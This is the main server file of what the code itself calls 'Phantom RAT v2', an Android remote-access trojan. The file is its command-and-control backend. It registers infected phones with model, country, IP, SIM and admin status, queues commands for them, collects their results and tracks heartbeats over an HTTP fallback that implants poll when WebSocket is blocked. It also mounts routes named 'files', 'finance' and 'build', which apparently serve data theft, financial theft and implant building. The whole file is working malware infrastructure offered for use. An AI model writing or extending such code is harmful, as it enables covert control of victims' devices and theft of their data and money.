import express from 'express';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { config } from './config.js';
import { initDb, dbApi } from './database.js';
import { attachWs } from './ws.js';
import { authRouter } from './routes/auth.js';
import { botsRouter } from './routes/bots.js';
import { commandsRouter } from './routes/commands.js';
import { filesRouter } from './routes/files.js';
import { financeRouter } from './routes/finance.js';
import { buildRouter } from './routes/build.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

await initDb();

const app = express();
app.use(express.json({ limit: '25mb' }));
app.use(express.static(path.join(__dirname, '../public'))); // web dashboard

app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));
app.use('/api/auth', authRouter);
app.use('/api/bots', botsRouter);
app.use('/api/commands', commandsRouter);
app.use('/api/files', filesRouter);
app.use('/api/finance', financeRouter);
app.use('/api/build', buildRouter);
app.get('/api/logs', (req, res) => res.json(dbApi.recentLogs(Number(req.query.limit || 100))));

/* ── HTTP fallback C2 (implant polls when WS is blocked) ── */
app.post('/hello', (req, res) => {
  const b = req.body ?? {};
  if (!b.id) return res.status(400).json({ error: 'id required' });
  dbApi.upsertBot({
    id: String(b.id), model: String(b.model || ''), android: String(b.android || ''),
    country: String(b.country || ''), ip: String(b.ip || ''), online: true, lastSeen: Date.now(),
    battery: Number(b.battery || 0), charging: !!b.charging, admin: !!b.admin,
    version: String(b.version || ''), sim: String(b.sim || ''), extra: '',
  });
  res.json({ ok: true });
});
app.get('/pending', (req, res) => {
  const botId = String(req.query.bot || '');
  if (!botId) return res.json([]);
  const cmds = dbApi.queued(botId).map(c => { dbApi.markSent(c.id); return { cmdId: c.id, cmd: c.cmd, args: c.args }; });
  res.json(cmds);
});
app.post('/result', (req, res) => {
  const { botId, cmdId, ok, data } = req.body ?? {};
  if (!botId || !cmdId) return res.status(400).json({ error: 'botId/cmdId required' });
  ok ? dbApi.markDone(Number(cmdId), String(data || '')) : dbApi.markFailed(Number(cmdId), String(data || ''));
  res.json({ ok: true });
});
app.post('/hb', (req, res) => {
  const botId = String(req.body?.bot || '');
  if (!botId) return res.status(400).json({ error: 'bot required' });
  dbApi.setOnline(botId, true);
  res.json({ ok: true });
});

const server = http.createServer(app);
attachWs(server);
server.listen(config.port, () => console.log(`[c2] Phantom RAT v2 · http://0.0.0.0:${config.port}`));
